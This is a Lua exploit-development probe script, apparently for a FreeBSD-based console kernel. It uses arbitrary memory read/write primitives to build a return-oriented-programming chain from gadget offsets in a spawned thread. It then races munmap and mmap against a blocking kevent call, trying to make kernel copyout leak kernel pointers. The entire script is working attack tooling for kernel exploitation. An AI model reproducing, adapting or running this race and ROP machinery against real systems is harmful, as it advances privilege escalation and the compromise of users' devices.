-- CRASH_CLASS: MODERATE
-- PROBE 398e: kevent output + munmap TOCTOU race
--
-- 398d proved kernel copyout doesn't re-validate buffer after wakeup.
-- kevent(363) blocks waiting for events and writes struct kevent to user buffer.
-- The kevent struct has fields the kernel fills: ident, filter, flags, fflags,
-- data, udata. On FreeBSD the struct is 32 bytes (64-bit).
-- If kernel metadata leaks into padding or fields during copyout on a
-- remapped page, we might see kernel pointers.
--
-- Strategy: register EVFILT_TIMER, block in kevent with timeout,
-- munmap+remap the output buffer, timer fires → kernel writes event.
-- Also try: EVFILT_READ on a socket, munmap, then write to trigger.

print("=== PROBE 398e: kevent+munmap race ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local pop_r8_ret  = g(0x991)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)

local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end)

local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x200)
local sf_lo, sf_hi = g_lohi(0x992)
local CHILD_STK = 0x800

-- ============================================
-- PART A: Baseline kevent with EVFILT_READ on socketpair
-- kevent struct (FreeBSD 64-bit): 32 bytes
-- +0x00: ident (8)   — fd number
-- +0x08: filter (2)  — EVFILT_READ=-1
-- +0x0A: flags (2)   — EV_ADD=1
-- +0x0C: fflags (4)
-- +0x10: data (8)    — bytes available
-- +0x18: udata (8)   — user pointer
-- ============================================
print("")
print("-- A: kevent baseline --")

-- Create kqueue
local ok_kq, kq_fd = pcall(function() return mk(362)() end)
kq_fd = ok_kq and N(kq_fd) or -1
print("kqueue=" .. kq_fd)

-- Create socketpair
local spbuf = memory.alloc(16)
wd(N(spbuf), 0xFFFF); wd(N(spbuf)+4, 0xFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf))) end)
local sock_r = rd(N(spbuf)) or -1
local sock_w = rd(N(spbuf) + 4) or -1
print(string.format("socks=%d,%d", sock_r, sock_w))

if kq_fd >= 0 and sock_r >= 0 then
    -- Register EVFILT_READ on sock_r with distinctive udata
    local changelist = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(changelist) + i, 0) end
    -- ident = sock_r
    wq(changelist, uint64(sock_r))
    -- filter = EVFILT_READ = -1 (0xFFFF as signed short)
    -- flags = EV_ADD = 0x0001
    wd(N(changelist) + 8, 0x0001FFFF) -- filter=-1, flags=1 (little-endian packed)
    -- fflags = 0
    wd(N(changelist) + 0x0C, 0)
    -- data = 0
    wq(uint64(N(changelist) + 0x10), uint64(0))
    -- udata = 0xDEADCAFE12345678 (distinctive marker)
    wq(uint64(N(changelist) + 0x18), uint64("0xDEADCAFE12345678"))

    -- kevent: register the filter (nchanges=1, nevents=0, no timeout)
    local ok_reg, rv_reg = pcall(function()
        return mk(363)(uint64(kq_fd), uint64(N(changelist)), uint64(1),
            uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("register=%d", ok_reg and N(rv_reg) or -999))

    -- Write data to make sock_r readable
    local sdata = memory.alloc(16)
    wd(N(sdata), 0xAAAABBBB)
    pcall(function() mk(4)(uint64(sock_w), uint64(N(sdata)), uint64(8)) end)

    -- kevent: poll with zero timeout
    local eventlist = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(eventlist) + i, 0xCC) end

    -- struct timespec {0, 0} for zero timeout
    local ts = memory.alloc(16)
    wq(ts, uint64(0)); wq(uint64(N(ts) + 8), uint64(0))

    local ok_poll, rv_poll = pcall(function()
        return mk(363)(uint64(kq_fd), uint64(0), uint64(0),
            uint64(N(eventlist)), uint64(4), uint64(N(ts)))
    end)
    local nevents = ok_poll and N(rv_poll) or -999
    print(string.format("poll=%d events", nevents))

    if nevents > 0 then
        -- Dump the kevent struct
        for off = 0, 0x1F, 4 do
            print(string.format("  ev+%02X: %08X", off, rd(N(eventlist) + off) or 0))
        end
        -- Check udata field (+0x18)
        local ud_lo = rd(N(eventlist) + 0x18) or 0
        local ud_hi = rd(N(eventlist) + 0x1C) or 0
        print(string.format("  udata=%X_%08X (expect DEADCAFE_12345678)", ud_hi, ud_lo))
    end

    -- Drain the socket for next test
    pcall(function() mk(3)(uint64(sock_r), uint64(N(sdata)), uint64(16)) end)
end
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: kevent + munmap TOCTOU race
-- Child: blocks in kevent(kq, 0, 0, eventlist, 1, NULL) waiting for events
-- Main: munmap eventlist, remap fresh page, then write to sock_w to trigger
-- The kernel should write the kevent struct to the remapped page
-- ============================================
print("")
print("-- B: kevent + munmap race --")

local RACE_COUNT = 15
local data_found = 0
local kptr_found = 0

for iter = 1, RACE_COUNT do
    -- Fresh socketpair + kqueue each iteration
    wd(N(spbuf), 0xFFFF); wd(N(spbuf)+4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf))) end)
    local sr = rd(N(spbuf)) or -1
    local sw = rd(N(spbuf) + 4) or -1
    if sr < 0 then print("[" .. iter .. "] sp fail"); break end

    local ok_kq2, kq2 = pcall(function() return mk(362)() end)
    kq2 = ok_kq2 and N(kq2) or -1
    if kq2 < 0 then
        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        print("[" .. iter .. "] kq fail"); break
    end

    -- Register EVFILT_READ on sr
    local cl = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(cl) + i, 0) end
    wq(cl, uint64(sr))
    wd(N(cl) + 8, 0x0001FFFF)
    wq(uint64(N(cl) + 0x18), uint64("0xCAFE0000" .. string.format("%04X", iter)))

    pcall(function()
        mk(363)(uint64(kq2), uint64(N(cl)), uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    -- Map victim page for event output
    local ok_vp, vpage = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local vph, vpl = 0, 0
    if ok_vp and vpage then vph, vpl = get_hi_lo(vpage) end
    if vph == 0 and vpl == 0 then
        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        pcall(function() mk(6)(uint64(kq2)) end)
        print("[" .. iter .. "] mmap fail"); break
    end
    local vpbase = vpl + vph * 0x100000000
    for i = 0, 0x3FFC, 4 do wd(vpbase + i, 0) end

    -- Build child: sysarch + kevent(kq2, 0, 0, vpage, 4, NULL) — BLOCKS
    local cs = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cs) + i, 0) end
    local cb = N(cs)
    local cr = ((cb + CHILD_STK) - ((cb + CHILD_STK) % 16)) - 8
    local sp = cr
    local function push(val) wq(sp, val); sp = sp + 8 end

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- kevent(kq2, NULL, 0, vpage, 4, NULL) — 6 args
    -- rax=363, rdi=kq2, rsi=0(changelist), rdx=0(nchanges),
    -- rcx=vpage(eventlist), r8=4(nevents), r9=0(timeout=NULL=block forever)
    push(pop_rax_ret); push(uint64(363))
    push(pop_rdi_ret); push(uint64(kq2))
    push(pop_rsi_ret); push(uint64(0))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(vpage)
    push(pop_r8_ret);  push(uint64(4))
    -- r9 = timeout pointer. We need NULL (block forever) but can't set r9.
    -- With uncontrolled r9, if it points to valid memory, kevent reads a
    -- timespec from it. If it's 0 (NULL), kevent blocks forever. If it's
    -- garbage, kevent may return immediately or crash.
    -- We'll try — if r9 happens to be 0 from sysarch, this works.
    push(stub)

    -- Store kevent return
    push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
    push(mov_rdi_rax)

    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xEEEE))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared), 0)
    wd(N(shared) + 0x10, 0xFF)

    -- Launch child
    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cb % 0x100000000, math.floor(cb / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

    -- Wait for child to enter blocking kevent
    local dummy = 0
    for i = 1, 40000 do dummy = dummy + 1 end

    -- ★ munmap + remap the event output page
    pcall(function() mk(73)(vpage, uint64(0x4000)) end)
    pcall(function()
        mk(477)(vpage, uint64(0x4000), uint64(0x3),
            uint64(0x1012), uint64(0xFFFFFFFF), uint64(0))
    end)

    -- Trigger: write to socket → EVFILT_READ fires → kernel writes event
    local trigger = memory.alloc(16)
    wd(N(trigger), 0xFEEDFEED)
    pcall(function() mk(4)(uint64(sw), uint64(N(trigger)), uint64(8)) end)

    -- Wait for child
    for i = 1, 100000 do dummy = dummy + 1 end

    local child_done = rd(N(shared)) or 0
    local kevent_ret = rd(N(shared) + 0x10) or 0xFF

    -- Scan the remapped page for kevent output
    local found_event = false
    local local_kptr = 0
    for off = 0, 0x3F, 4 do  -- first 64 bytes (two kevent structs)
        local v = rd(vpbase + off) or 0
        if v ~= 0 then
            found_event = true
            local vh = math.floor(v / 0x10000)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                local_kptr = local_kptr + 1
                kptr_found = kptr_found + 1
                print(string.format("[%d] KPTR ev+%02X: %08X", iter, off, v))
            end
        end
    end

    if found_event then
        data_found = data_found + 1
        if data_found <= 5 then
            local dump = ""
            for off = 0, 0x1F, 4 do
                dump = dump .. string.format("%08X ", rd(vpbase + off) or 0)
            end
            print(string.format("[%d] kevent=%d done=%X: %s",
                iter, kevent_ret, child_done, dump))
        end
    end

    -- Cleanup
    pcall(function() mk(73)(vpage, uint64(0x4000)) end)
    pcall(function() mk(6)(uint64(sr)) end)
    pcall(function() mk(6)(uint64(sw)) end)
    pcall(function() mk(6)(uint64(kq2)) end)

    if not alive() then print("CANARY FAIL iter " .. iter); break end
end

print(string.format("result: data=%d kptr=%d", data_found, kptr_found))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 398e COMPLETE ===")
